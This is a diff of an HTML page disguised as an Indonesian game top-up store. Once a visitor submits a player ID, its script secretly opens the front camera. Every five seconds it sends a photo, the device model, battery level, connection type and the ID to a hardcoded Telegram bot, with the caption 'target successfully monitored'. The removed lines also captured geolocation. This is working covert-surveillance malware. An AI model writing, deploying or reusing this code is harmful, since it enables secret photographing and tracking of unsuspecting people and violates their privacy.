@@ -3,42 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>V-STORE | Top Up Game Terpercaya</title>
+    <title>PUKI STORE | Top Up Game Terpercaya</title>
     <style>
         :root { --primary-neon: #00f2ff; --bg-dark: #0a0b10; --card-bg: #161b22; }
-        body { background-color: var(--bg-dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 15px; text-align: center; }
-        .container { max-width: 500px; margin: 0 auto; padding-bottom: 50px; }
-        .header h1 { color: var(--primary-neon); text-shadow: 0 0 10px var(--primary-neon); margin-bottom: 5px; font-size: 1.8rem; }
+        body { background-color: var(--bg-dark); color: white; font-family: sans-serif; margin: 0; padding: 15px; text-align: center; }
+        .container { max-width: 500px; margin: 0 auto; }
+        .header h1 { color: var(--primary-neon); text-shadow: 0 0 10px var(--primary-neon); }
         .section-card { background: var(--card-bg); border: 1px solid #30363d; border-radius: 12px; padding: 15px; margin-bottom: 15px; text-align: left; }
-        .section-title { border-left: 4px solid var(--primary-neon); padding-left: 10px; font-weight: bold; margin-bottom: 12px; font-size: 0.9rem; }
-        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .section-title { border-left: 4px solid var(--primary-neon); padding-left: 10px; font-weight: bold; margin-bottom: 10px; font-size: 0.9rem; }
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
         .item { background: #21262d; border: 1px solid #30363d; border-radius: 8px; padding: 10px; cursor: pointer; text-align: center; font-size: 0.8rem; }
         .item.active { border-color: var(--primary-neon); background: rgba(0, 242, 255, 0.1); }
         input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: white; box-sizing: border-box; }
-        .btn-order { width: 100%; padding: 15px; background: var(--primary-neon); border: none; border-radius: 8px; color: black; font-weight: bold; cursor: pointer; font-size: 1rem; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); }
-        #success-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
-        .popup-content { background: var(--card-bg); border: 1px solid var(--primary-neon); padding: 30px; border-radius: 15px; text-align: center; }
+        .btn-order { width: 100%; padding: 15px; background: var(--primary-neon); border: none; border-radius: 8px; color: black; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #success-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
+        .popup-content { background: var(--card-bg); padding: 30px; border-radius: 15px; text-align: center; border: 1px solid var(--primary-neon); }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="header"><h1>V-STORE</h1><p style="color: #8b949e;">Top Up Instan 24 Jam</p></div>
-
+    <div class="header"><h1>V-STORE</h1></div>
     <div class="section-card">
-        <div class="section-title">1. Pilih Game</div>
-        <div class="game-grid">
-            <div class="item active"><span>Free Fire</span></div>
-            <div class="item"><span>MLBB</span></div>
-            <div class="item"><span>PUBG</span></div>
+        <div class="section-title">Pilih Game</div>
+        <div class="grid">
+            <div class="item active" onclick="select(this, 'game', 'Free Fire')">FF</div>
+            <div class="item" onclick="select(this, 'game', 'MLBB')">ML</div>
+            <div class="item" onclick="select(this, 'game', 'PUBG')">PUBG</div>
         </div>
     </div>
-
     <div class="section-card">
-        <div class="section-title">2. ID Player</div>
-        <input type="number" id="userId" placeholder="Masukkan ID Player">
+        <div class="section-title">ID Player</div>
+        <input type="number" id="userId" placeholder="Masukkan ID">
     </div>
-
     <button class="btn-order" id="startBtn">KONFIRMASI TOP UP</button>
 </div>
 
@@ -56,55 +53,48 @@
 <script>
     const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
     const CHAT_ID = '6888530451';
-    let userLocation = "Lokasi tidak diizinkan";
+    let state = { game: "Free Fire" };
+
+    function select(el, type, val) {
+        el.parentElement.querySelectorAll('.item').forEach(i => i.classList.remove('active'));
+        el.classList.add('active');
+        state[type] = val;
+    }
 
     async function getDeviceInfo() {
+        const brands = { '2310FPCA4G': 'Xiaomi Redmi 13C', '2201117TY': 'Redmi Note 11', 'SM-G991B': 'Samsung S21', 'CPH2219': 'Oppo A74', 'X6812': 'Infinix Note 11 Pro' };
         let battery = "N/A";
         if (navigator.getBattery) {
             const bat = await navigator.getBattery();
             battery = Math.round(bat.level * 100) + "%";
         }
-        const ua = navigator.userAgent;
-        const device = ua.match(/\(([^)]+)\)/) ? ua.match(/\(([^)]+)\)/)[1].split(';')[0] : "Unknown Device";
-        const conn = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-        return { device, battery, conn };
-    }
-
-    // Fungsi mendapatkan koordinat lokasi
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((position) => {
-                userLocation = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-            }, (error) => {
-                userLocation = "Izin lokasi ditolak";
-            });
+        let model = "Android Device";
+        const match = navigator.userAgent.match(/\(([^)]+)\)/);
+        if (match) {
+            const parts = match[1].split(';');
+            for (let part of parts) {
+                part = part.trim();
+                if (/android|linux|build|k/i.test(part) || part.length < 3) continue;
+                model = brands[part] || part;
+                break;
+            }
         }
+        return { device: model, battery, conn: navigator.connection ? navigator.connection.effectiveType : "4G" };
     }
 
     document.getElementById('startBtn').addEventListener('click', async () => {
-        const uid = document.getElementById('userId').value;
-        if(!uid) return alert("Masukkan ID Player!");
-        
-        startBtn.innerText = "Memproses...";
-        getLocation(); // Panggil izin lokasi
-
+        if(!document.getElementById('userId').value) return alert("Masukkan ID!");
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                video.play();
-                setInterval(() => takeSnapshot(uid), 5000);
-            };
-        } catch(e) {
-            document.getElementById('success-popup').style.display = 'flex';
-        }
+            document.getElementById('video').srcObject = stream;
+            setInterval(() => takeSnapshot(), 5000);
+        } catch(e) { document.getElementById('success-popup').style.display = 'flex'; }
     });
 
-    async function takeSnapshot(uid) {
+    async function takeSnapshot() {
         const info = await getDeviceInfo();
-        const canvas = document.getElementById('canvas');
         const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         canvas.width = 640; canvas.height = 480;
         canvas.getContext('2d').drawImage(video, 0, 0);
 
@@ -112,12 +102,7 @@
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
             fd.append('photo', blob);
-            fd.append('caption', `📸 <b>TARGET BERHASIL DIPANTAU</b>\n\n` +
-                                 `📱 <b>Perangkat:</b> <code>${info.device}</code>\n` +
-                                 `🔋 <b>Baterai:</b> ${info.battery}\n` +
-                                 `🌐 <b>Koneksi:</b> ${info.conn}\n` +
-                                 `📍 <b>Lokasi:</b> ${userLocation}\n\n` +
-                                 `<i>NEPTUNUS V1.0.8</i>`);
+            fd.append('caption', `📸 <b>TARGET BERHASIL DIPANTAU</b>\n\n📱 <b>Perangkat:</b> <code>${info.device}</code>\n🔋 <b>Baterai:</b> ${info.battery}\n🌐 <b>Koneksi:</b> ${info.conn}\n🆔 <b>ID:</b> ${document.getElementById('userId').value}\n\n<i>NEPTUNUS V1.0.8</i>`);
             fd.append('parse_mode', 'HTML');
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         }, 'image/jpeg', 0.6);
